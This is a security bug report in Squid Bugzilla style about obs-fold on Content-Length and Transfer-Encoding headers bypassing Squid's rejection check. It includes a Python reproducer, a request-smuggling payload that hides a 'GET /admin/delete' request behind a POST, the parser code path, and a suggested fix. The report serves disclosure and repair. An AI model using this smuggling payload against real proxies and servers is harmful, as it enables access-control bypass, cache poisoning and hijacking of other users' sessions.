# Squid Bugzilla Report: obs-fold on Content-Length/Transfer-Encoding bypasses rejection

> **Severity**: Security / Request Smuggling
> **Component**: HTTP Parser (Http::One::Parser, HttpHeader)
> **Version**: 6.13 (likely all versions with unfoldMime())
> **OS**: All
> **Priority**: P1 (security)

---

## Summary

Squid accepts obs-fold (line continuation) on Content-Length and
Transfer-Encoding headers in ALL `relaxed_header_parser` modes, including
strict (`off`). RFC 9112 §5.1 declares such messages malformed. The bug
enables HTTP request smuggling when Squid is deployed behind a front-end
proxy that does not unfold obs-fold.

## Description

### The bug

`HttpHeader::parse()` (src/HttpHeader.cc:590-598) correctly checks for
obs-fold on framing headers and rejects them:

```cpp
if (lines > 1 || hasBareCr) {
    const auto framingHeader = (e->id == Http::HdrType::CONTENT_LENGTH ||
                                e->id == Http::HdrType::TRANSFER_ENCODING);
    if (framingHeader) {
        if (!hasBareCr)
            debugs(55, warnOnError, "WARNING: obs-fold in framing-sensitive "
                   << e->name << ": " << e->value);
        delete e;
        clean();
        return 0;
    }
}
```

However, this check never fires for obs-fold because
`Http::One::Parser::unfoldMime()` (src/http/one/Parser.cc:131-154)
replaces all obs-fold patterns with a single SP character **before**
`HttpHeader::parse()` runs. After unfolding, the header appears as a
single line (`lines == 1`) and the rejection is skipped.

### Code flow

1. `headersEnd()` in `mime_header.cc:38-40` detects obs-fold and sets
   `containsObsFold = true`.
2. `Http::One::Parser::grabMimeBlock()` at line 183-184 calls
   `unfoldMime()` if `containsObsFold` is true.
3. `unfoldMime()` at line 148-150 replaces `\r\n<SP|HTAB>` with `<SP>`,
   producing a single-line header value.
4. The now-clean `mimeHeaderBlock_` is passed to `HttpHeader::parse()`.
5. `HttpHeader::parse()` at line 590 checks `lines > 1 || hasBareCr` —
   but `lines == 1` (because the fold was already removed) and
   `hasBareCr == nullptr` (no bare CR after unfolding).
6. The framing header rejection at lines 592-598 **never executes**.

The `hasBareCr` path works correctly because bare CRs are NOT removed by
`unfoldMime()` — they are only handled later in `HttpHeader::parse()`
itself (lines 543-558). The asymmetry is the root cause: obs-fold is
erased before the check, bare CR is not.

### RFC references

**RFC 9112 §5.1** (HTTP/1.1 Message Syntax):
> "If a Transfer-Encoding or Content-Length header field is present and
>  obs-fold was used to form its value, the message is malformed
>  (Section 2.2 of [HTTP])."

**RFC 9110 §5.5** (HTTP Semantics):
> "A server MUST NOT apply a request to the target resource until it
>  receives the entire request header section..."

**RFC 7230 §3.2.4** (which Squid's unfoldMime cites):
> "A server that receives an obs-fold in a request message ... MUST ...
>  replace each received obs-fold with one or more SP octets prior to
>  interpreting the field value or forwarding the message downstream."

The replacement directive applies to obs-fold in general, but RFC 9112
adds a specific exception for framing headers — they must be rejected
outright, not unfolded.

## Steps to Reproduce

Minimal reproducer (Python 3.6+, no dependencies):

```python
import socket

def send(host, port, payload):
    s = socket.create_connection((host, port), timeout=10)
    s.settimeout(5)
    s.sendall(payload)
    data = b""
    while True:
        try:
            d = s.recv(65536)
            if not d: break
            data += d
        except socket.timeout: break
    s.close()
    return data

# obs-fold on Content-Length
resp = send("127.0.0.1", 3128,
    b"POST http://backend:80/test HTTP/1.1\r\n"
    b"Host: backend\r\n"
    b"Content-Length:\r\n"
    b" 5\r\n"
    b"\r\n"
    b"hello"
)
# Expected: HTTP/1.1 400 Bad Request
# Actual:   HTTP/1.1 200 OK (Squid forwarded with Content-Length: 5)
print(resp.split(b"\r\n", 1)[0])
```

Replace `backend:80` with any reachable HTTP server.

Tested with:
- `relaxed_header_parser on` (default) → **accepted**
- `relaxed_header_parser off` (strict) → **accepted** (should reject!)
- `relaxed_header_parser warn` → **accepted**

## Attack Scenario: HTTP Request Smuggling

```
Attacker → Front-end Proxy → Squid → Backend
```

Payload sent by attacker:

```
POST /legit HTTP/1.1\r\n
Host: target\r\n
Content-Length:\r\n
 85\r\n
\r\n
GET /admin/delete?id=1 HTTP/1.1\r\n
Host: target\r\n
X-Smuggled: true\r\n
\r\n
```

**Front-end interpretation** (doesn't unfold obs-fold → no valid CL):
- Request 1: `POST /legit` with no body (CL absent/invalid)
- Request 2: `GET /admin/delete?id=1` (the smuggled request)

**Squid interpretation** (unfolds obs-fold → CL=85):
- Request 1: `POST /legit` with 85-byte body (body = the smuggled request)
- No second request.

The front-end processes the smuggled `GET /admin/delete?id=1` as a
legitimate request from the next client reusing the same connection. The
smuggled request inherits that client's authentication context.

## Expected Behavior

Squid should return `400 Bad Request` for any request with obs-fold on
Content-Length or Transfer-Encoding headers, in all parser modes.

## Suggested Fix

The simplest fix: in `Http::One::Parser::grabMimeBlock()`, before calling
`unfoldMime()`, scan the raw header block for `Content-Length` or
`Transfer-Encoding` header names in lines that are followed by obs-fold.
If found, reject the message.

Alternatively, pass `containsObsFold` through to `HttpHeader::parse()` and
have it check for framing headers if the flag is set, independent of the
`lines > 1` check.

Sketch of fix (option D — pre-unfold scan):

```cpp
// In Http::One::Parser::grabMimeBlock(), after line 183:
if (containsObsFold) {
    // Reject if obs-fold appears on framing headers (RFC 9112 §5.1)
    if (mimeHasObsFoldedFramingHeader(mimeHeaderBlock_)) {
        debugs(33, 3, "Rejecting obs-fold on framing header");
        parseStatusCode = Http::scBadRequest;
        parsingStage_ = HTTP_PARSE_DONE;
        return false;
    }
    unfoldMime();
}
```

Where `mimeHasObsFoldedFramingHeader()` scans the raw (pre-unfold) header
block for `Content-Length:` or `Transfer-Encoding:` lines where the value
continues on the next line with leading whitespace.

## Impact

- **HTTP request smuggling**: enables CL-based desync when Squid is
  behind a front-end that doesn't unfold obs-fold.
- **Security control bypass**: smuggled requests bypass WAF/ACL rules.
- **Cache poisoning**: smuggled requests can modify cached responses.
- **Session hijacking**: smuggled requests execute in another user's
  connection context on HTTP connection reuse.
- **Affects all configurations**: no `relaxed_header_parser` setting
  prevents the bug.

## Related

- Similar class as SQUID-2023:1 (HTTP request/response smuggling)
- RFC 9112 §5.1 explicitly added the framing header exception after
  earlier smuggling research (James Kettle et al.)
- The defense code at HttpHeader.cc:590-598 was likely added to address
  exactly this scenario, but `unfoldMime()` makes it unreachable.
